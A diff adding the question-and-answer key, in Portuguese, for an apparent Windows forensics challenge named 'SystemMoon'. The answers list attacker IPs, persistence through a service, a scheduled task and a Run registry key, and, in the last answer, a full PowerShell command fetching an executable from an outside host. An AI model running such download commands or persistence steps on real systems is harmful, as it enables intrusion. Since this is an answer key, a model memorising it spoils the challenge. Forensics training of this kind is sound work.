@@ -1,0 +1,12 @@
+Perguntas do Desafio SystemMoon
+
+- Qual IP realizou ataques para advinhar a senha do usuário administrator? R: 192.168.230.130
+- Qual nome do serviço instalado na máquina? R: Inoffensive_Update 
+- Qual o número do ZoneId referente ao arquivo PSTools? R: 3
+- Em qual pasta foi feito o download do arquivo mon.exe? R: C:\Windows\Temp\
+- Qual IP realizou RDP na máquina às 15:23 do dia 08 de janeiro de 2023? R: 192.168.230.147
+- Qual o tipo de logon realizou o usuário anônimo (exemplo: 9)? R: 3
+- Qual PID do processo a.exe? R: 8652
+- Qual o nome da tarefa agendada criada para execução de moon.exe? R: Task_Inoffensive
+- Qual o valor do registro criado em HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run para execução de moon2.exe? R: Inoffensive_Reg
+- Qual comando em powershell completo utilizado para baixar o arquivo noom.exe? R: powershell  -c iwr -uri http://msmoon.net/noom.exe -O noom.exe
